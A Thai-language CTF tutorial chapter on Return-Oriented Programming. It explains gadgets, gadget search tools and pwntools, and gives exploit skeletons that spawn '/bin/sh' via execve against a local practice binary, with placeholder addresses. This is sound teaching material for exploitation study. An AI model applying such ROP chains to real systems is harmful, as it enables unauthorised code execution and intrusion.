# บท 8 — ROP Chain (Return-Oriented Programming)

ROP คือหัวใจของ pwn ยุค NX เมื่อรัน shellcode บน stack ไม่ได้ เราจึง
"ประกอบโปรแกรม" จากชิ้นส่วนโค้ดที่มีอยู่แล้วใน binary แทน

## ปัญหาที่ ROP แก้

NX enabled = stack เขียนได้แต่รันไม่ได้ → inject shellcode ไม่ได้

**ทางออก:** โค้ดใน binary/libc รันได้อยู่แล้ว เราแค่เอาชิ้นเล็กๆ ของมัน
มาต่อกันให้ทำงานตามที่เราต้องการ

## Gadget คืออะไร

**gadget** = ลำดับคำสั่งสั้นๆ ที่ลงท้ายด้วย `ret` เราเจอมันกระจายอยู่ทั่ว
binary

```asm
pop rdi
ret          ← นี่คือ gadget "pop rdi; ret"

pop rsi
pop r15
ret          ← gadget "pop rsi; pop r15; ret"
```

## หลักการทำงานของ ROP chain

จำจากบท 2: `ret` = `pop rip` มันดึงค่าบนสุดของ stack ใส่ RIP แล้วกระโดด

ถ้าเราวาง address ของ gadget เรียงกันบน stack แต่ละ `ret` จะพา RIP
กระโดดไป gadget ถัดไปเรื่อยๆ = รันโค้ดที่เราออกแบบ

```
stack ที่เราวาง:          การทำงาน:
┌─────────────┐
│ pop_rdi     │  →  รัน pop rdi (ดึงค่าถัดไปเข้า RDI) แล้ว ret
├─────────────┤
│ binsh_addr  │  →  ค่านี้เข้า RDI
├─────────────┤
│ system      │  →  ret มาที่นี่ = เรียก system() ด้วย RDI=binsh
└─────────────┘
```

แต่ละบรรทัดที่เป็น gadget จะ "ทำงานแล้วส่งต่อ" ให้บรรทัดถัดไป

## หา gadget

```bash
# ROPgadget
ROPgadget --binary ./vuln                       # ดูทั้งหมด
ROPgadget --binary ./vuln | grep "pop rdi"      # หาเฉพาะ
ROPgadget --binary ./vuln | grep "pop rsi"

# ทางเลือกอื่น
ropper --file ./vuln --search "pop rdi"
```

ใน pwntools:

```python
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]
```

## ตัวอย่าง: สร้าง ROP chain เรียก execve("/bin/sh", 0, 0)

สมมติ NX เปิด ไม่มี system ต้องเรียก syscall `execve` เอง

execve ต้องการ:
- `RAX = 59` (หมายเลข syscall ของ execve)
- `RDI = address ของ "/bin/sh"`
- `RSI = 0`
- `RDX = 0`
- แล้ว `syscall`

```python
from pwn import *
context.binary = elf = ELF('./vuln')
p = process('./vuln')

# หา gadget ที่ต้องใช้
pop_rax = 0x...      # pop rax; ret
pop_rdi = 0x...      # pop rdi; ret
pop_rsi = 0x...      # pop rsi; ret
pop_rdx = 0x...      # pop rdx; ret
syscall = 0x...      # syscall
binsh   = 0x...      # address ของ "/bin/sh" (หาใน binary หรือเขียนเองด้วย)

chain = flat(
    b'A' * 72,
    p64(pop_rdi), p64(binsh),   # RDI = "/bin/sh"
    p64(pop_rsi), p64(0),       # RSI = 0
    p64(pop_rdx), p64(0),       # RDX = 0
    p64(pop_rax), p64(59),      # RAX = 59 (execve)
    p64(syscall),               # execve("/bin/sh", 0, 0)
)
p.sendline(chain)
p.interactive()
```

## ให้ pwntools สร้าง chain อัตโนมัติ

pwntools ฉลาดพอจะต่อ gadget ให้เอง:

```python
rop = ROP(elf)

# เรียกฟังก์ชันตรงๆ
rop.call('system', [next(libc.search(b'/bin/sh'))])

# หรือทำ execve syscall
rop.execve(binsh, 0, 0)

# ดู chain ที่ได้
print(rop.dump())

payload = flat(b'A' * 72, rop.chain())
```

## เขียน "/bin/sh" เองถ้าไม่มีใน binary

บางโจทย์ไม่มี string "/bin/sh" ในไฟล์ เราต้องเขียนลงใน memory เอง
(เช่นที่ .bss ซึ่งเขียนได้) ด้วย gadget `mov [rax], rbx` แล้วค่อยชี้ RDI ไป

```python
bss = elf.bss()                # address ที่เขียนได้

# gadget สมมติ: pop rax; ret  และ  pop rbx; ret  และ  mov [rax], rbx; ret
chain = flat(
    p64(pop_rax), p64(bss),
    p64(pop_rbx), b'/bin/sh\x00',
    p64(mov_rax_rbx),          # เขียน "/bin/sh" ลง bss
    # ... แล้ว execve(bss, 0, 0)
)
```

> เคสนี้เจอในโจทย์ medium ขึ้นไป ตอนเริ่มไม่ต้องรีบ เข้าใจ chain พื้นฐานก่อน

## เทคนิค ret2csu (เมื่อหา pop rdx ไม่เจอ)

บางโจทย์หา gadget `pop rdx` ไม่เจอ มีเทคนิค **ret2csu** ที่ใช้ฟังก์ชัน
`__libc_csu_init` (มีในเกือบทุก binary ที่ compile แบบ static-ish) เพื่อ
ควบคุม RDX, RSI ได้ — ไว้ศึกษาตอน chain พื้นฐานคล่องแล้ว

---

## Debugging ROP chain

chain พังบ่อย ดูด้วย GDB:

```python
p = gdb.debug('./vuln', 'break *0x401200')   # break ที่จุด ret
```

```bash
pwndbg> telescope $rsp 20      # ดูว่า chain เราวางถูกไหม
pwndbg> ni                     # step ทีละ gadget ดูว่าไปถูกทาง
```

ดูว่า RIP กระโดดตาม gadget ที่วางไว้จริงไหม ถ้าหลุด = วาง address ผิด/offset ผิด

---

## สรุปบทนี้

- ROP = ต่อ gadget (โค้ดลงท้าย `ret`) แทน shellcode เมื่อ NX เปิด
- แต่ละ `ret` พา RIP ไป gadget ถัดไปบน stack
- หา gadget: `ROPgadget` / `rop.find_gadget()`
- pwntools ต่อ chain ให้อัตโนมัติได้ด้วย `rop.call()` / `rop.chain()`
- debug ด้วย `telescope $rsp` + step ทีละ gadget

โจทย์ฝึก: ROP Emporium ครบทุกด่าน (**write4**, **badchars**, **pivot**),
picoCTF ROP challenges

บทต่อไป: Format String →
